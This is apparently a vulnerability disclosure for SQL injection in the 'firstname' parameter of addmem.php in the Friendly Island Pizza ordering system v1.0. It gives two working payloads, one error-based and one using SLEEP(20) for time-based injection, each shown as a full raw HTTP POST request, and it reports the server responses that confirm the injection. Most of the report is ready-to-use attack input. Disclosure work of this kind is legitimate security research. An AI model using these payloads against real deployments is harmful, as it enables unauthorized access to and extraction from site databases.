# Friendly Island Pizza Website and Ordering System v1.0 has SQL injection

BUG_Author: AureliusLia

Website source address:https://www.sourcecodester.com/php/14730/friendly-island-pizza-website-php-mysql.html

Vulnerability File: /FriendlyIsPizzaWebsite/addmem.php

POST parameter 'firstname' exists SQL injection vulnerability

Payload1:firstname=a' or (select 1 from(select count(*),concat(0x71727374,(select (elt(666=666,1))),0x61626364,floor(rand(0)*2))x from information_schema.plugins group by x)a) AND 'a'='a&lastname=b&email=c&pword=xB!7x!&ambot=d&number=1&house=e&street=f&city=g

```
POST /FriendlyIsPizzaWebsite/addmem.php HTTP/1.1
Host: localhost
Origin: http://localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Connection: close
Cookie: PHPSESSID=2kc1au0d975mouepdpqqpeqdn4
Upgrade-Insecure-Requests: 1

firstname=a' or (select 1 from(select count(*),concat(0x71727374,(select (elt(666=666,1))),0x61626364,floor(rand(0)*2))x from information_schema.plugins group by x)a) AND 'a'='a&lastname=b&email=c&pword=xB!7x!&ambot=d&number=1&house=e&street=f&city=g
```

Injection success based on errors

![image](https://github.com/AureliusLia/bug_report/blob/main/pictures/sql1.png)

Payload2:firstname=a' and (select 2 from (select(SLEEP(20)))b) AND 'a'='a&lastname=b&email=c&pword=xB!7x!&ambot=d&number=1&house=e&street=f&city=g

```
POST /FriendlyIsPizzaWebsite/addmem.php HTTP/1.1
Host: localhost
Origin: http://localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Connection: close
Cookie: PHPSESSID=2kc1au0d975mouepdpqqpeqdn4
Upgrade-Insecure-Requests: 1

firstname=a' and (select 2 from (select(SLEEP(20)))b) AND 'a'='a&lastname=b&email=c&pword=xB!7x!&ambot=d&number=1&house=e&street=f&city=g
```

Server response time is 20 seconds

![image](https://github.com/AureliusLia/bug_report/blob/main/pictures/sql2.png)
